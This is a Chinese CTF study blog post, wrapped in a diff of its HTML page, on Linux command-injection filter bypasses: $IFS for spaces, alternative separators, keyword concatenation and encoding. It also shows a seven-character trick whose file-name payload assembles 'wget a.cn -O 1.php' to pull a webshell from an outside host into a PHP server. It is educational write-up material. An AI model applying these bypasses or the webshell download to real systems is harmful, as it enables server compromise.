@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于命令执行的初步学习 | Iuhrey的幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。 前置知识现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:wget:在后面接上下载文件的地址，可以将文件下载下来">
+<meta name="keywords" content="命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于命令执行的初步学习">
+<meta property="og:url" content="http://yoursite.com/2018/10/08/关于命令执行的学习/index.html">
+<meta property="og:site_name" content="Iuhrey的幻想乡">
+<meta property="og:description" content="前言在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。 前置知识现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:wget:在后面接上下载文件的地址，可以将文件下载下来">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/18/1.png">
+<meta property="og:image" content="http://yoursite.com/images/18/2.png">
+<meta property="og:image" content="http://yoursite.com/images/18/3.png">
+<meta property="og:image" content="http://yoursite.com/images/18/4.png">
+<meta property="og:image" content="http://yoursite.com/images/18/5.png">
+<meta property="og:image" content="http://yoursite.com/images/18/6.png">
+<meta property="og:image" content="http://yoursite.com/images/18/7.png">
+<meta property="og:image" content="http://yoursite.com/images/18/8.png">
+<meta property="og:updated_time" content="2018-10-13T09:18:35.084Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于命令执行的初步学习">
+<meta name="twitter:description" content="前言在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。 前置知识现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:wget:在后面接上下载文件的地址，可以将文件下载下来">
+<meta name="twitter:image" content="http://yoursite.com/images/18/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico" />
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-关于命令执行的学习" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/08/关于命令执行的学习/" class="article-date">
+  <time class="post-time" datetime="2018-10-08T11:33:09.000Z" itemprop="datePublished">
+    <span class="post-month">10月</span><br/>
+    <span class="post-day">08</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      关于命令执行的初步学习
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:<br>wget:在后面接上下载文件的地址，可以将文件下载下来。-C参数可以将文件保存为你所要的文件名。这个命令一般用来下载shell，在无法写入shell的时候可以尝试。<br>>:定向输出到文件，如果文件不存在，就创建文件；如果文件存在，就将其清空。这个一般用法是通过  echo “内容” &gt;文件名  的格式来将内容写入文件里面，一般是用来写入shell。<br>;:命令分隔符<br>…….<br>其他的命令自行查阅<a href="http://www.cnblogs.com/yjd_hycf_space/p/7730690.html" target="_blank" rel="noopener">Linux常用命令大全</a></p>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>一般来说，我们通过网页输入的命令会经过php代码的过滤以及转义处理才进而在服务器中执行，很多过滤操作也是由php代码来完成，所以很多绕过方式也是基于php环境的(例如上一篇的过滤绕过方式)。</p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>过滤的时候可能会通过过滤空格来阻止命令执行:<br><img src="/images/18/1.png" alt=""><br>通过测试可以看见当在过滤了空格之后cat命令是无法执行的，但是无伤大雅，图中可以看到我们可以通过几种方式来绕过:<br>&lt;<br>$IFS$9<br>${IFS}<br>$IFS在测试时发现，无法输出任何东西，主要原因是因为$IFS类似一个截断字符，具体原理也不详谈，总而言之就是将{}加入之后就能稳定的让命令执行。<br>还有一个在php环境下可以替代空格的字符%09，可以在php环境下进行测试。</p>
+<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><p>命令分隔符简而言之就是链接两个命令的符号，在linux中最为常见的就是；，但是依旧有替代的符号可以在过滤了;的情况下进行命令分隔:<br><img src="/images/18/2.png" alt=""><br>可以看到最为基本的就是;进行分割，测试中发现|和&amp;只能起到执行后者命令的作用，看大手子的文章是说执行了但不回显，具体原理不去深究，在php环境下如下字符也是可以起到命令分隔的作用的:<br><img src="/images/18/3.png" alt=""></p>
+<h3 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h3><p>顾名思义就是终止命令的符号，有%00，%20也就是#的编码。</p>
+<h3 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h3><p>这一部分在上一篇文章详细写过了，这里主要再提一些Linux下的绕过操作:<br><img src="/images/18/4.png" alt=""><br>如上图所示，我列出了三种方法，第一种是通过构造几个变量，然后拼接而成；第二种和第一种类似，通过字符串的拼接来绕过关键词过滤；第三种则是编码绕过，最为常见的就是base64，在有其他环境的情况下还可以使用其他的编码，不过值得注意的是需要学会如何在linux下进行解码。</p>
+<h2 id="七个字的命令执行"><a href="#七个字的命令执行" class="headerlink" title="七个字的命令执行"></a>七个字的命令执行</h2><p>这也是我参考了很多大牛写的有关命令执行的文章中所提到一个最开始研究这方向的原因，题目短小精简，代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我一开始思路就是要么下一个shell，要么写入一个shell，但是发现这貌似有点行不通，例如当我们需要下载一个shell时，<strong>wget xxxx</strong>这里是肯定要超过8个字数限制的，然后写入shell这个思路怕是更加不行，我们写入的话必须用echo “xxx”&gt;1，除去xxx单单必要的函数加符号就有8个，所以两种方式都不行。<br>根据大手子的文章，发现了一个&gt;写入符号的特性，我们可以使用&gt;1来建立一个名为1的文件，但是没有echo的存在是无法写入任何内容的。继续跟着思路走，既然我们可以建立很多文件，那我们有没有可能把文件名一个一个总的写入一个新的文件呢？大手子提到的第二个操作就是<strong>ls&gt;a</strong>，ls列出所有的文件名然后写入a的新文件中：<br><img src="/images/18/5.png" alt=""><br>但是如图所示写入之后发现有几个问题：第一就是写入的内容是通过ASCII码来进行排序的，也就是说我们这样写必须得时刻注意文件名开头的ASCII码排序，如果在写入shell时要注意这个问题的话太过烦琐了，这个时候就可以用时间排序来进行排列，ls -t排序是把最先创建的文件排在最后：<br><img src="/images/18/6.png" alt=""><br>也就是说我们可以通过ls -t解决排序问题，接着就是没有办法写入&lt;?&gt;这几个符号，也就是说我们没办法写入shell，那只剩一条路了，就是通过写入wget a.cn来下载一个shell了：<br><img src="/images/18/7.png" alt=""><br>但是这时候出现了一个问题，就是我们输入的内容没办法有效的当成命令来执行，这里就需要用到\这个转义符来拼接命令了，在例如ec   ho时，我们可以通过转义换行符来拼接成echo这个命令，如下所示:<br><img src="/images/18/8.png" alt=""><br>可以看到我们通过用\转义符替代了;以及成功转义了换行符成功拼接了命令，echo成功输出了1，所以思路出来了，我们构造如下命令就可以写入shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;1.php</span><br><span class="line">&gt;-O\ \\</span><br><span class="line">&gt;cn\ \\</span><br><span class="line">&gt;\ a.\\</span><br><span class="line">&gt;wget\\</span><br></pre></td></tr></table></figure></p>
+<p>参考文章：<br><a href="https://blog.csdn.net/qq_27446553/article/details/73927518" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a><br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="noopener">从七个字符长度的任意命令执行到GetShell</a><br><a href="https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/" target="_blank" rel="noopener"><br>HITCON2017-writeup整理</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjn3ccghb001dbkve9wk96ywn" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/27/绕过过滤getshell的一些骚操作/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">绕过过滤getshell的一些骚操作</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Iuhrey的幻想乡</h1>
+    <h2 class="blog-subtitle">记录日常所学</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 Iuhrey<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
